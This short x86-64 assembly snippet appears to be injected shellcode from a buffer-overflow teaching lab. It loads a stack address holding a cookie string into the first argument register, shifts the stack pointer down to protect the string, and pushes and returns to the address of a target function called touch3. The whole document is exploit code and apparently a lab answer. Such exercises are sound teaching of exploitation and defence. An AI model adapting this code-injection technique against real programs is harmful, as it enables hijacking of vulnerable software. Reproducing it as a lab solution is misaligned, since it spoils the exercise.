movq     $0x5561dc78, %rdi   # the cookie
sub      $0x30,%rsp          # protect the string in the stack
pushq    $0x4018fa           # the address of touch3
ret
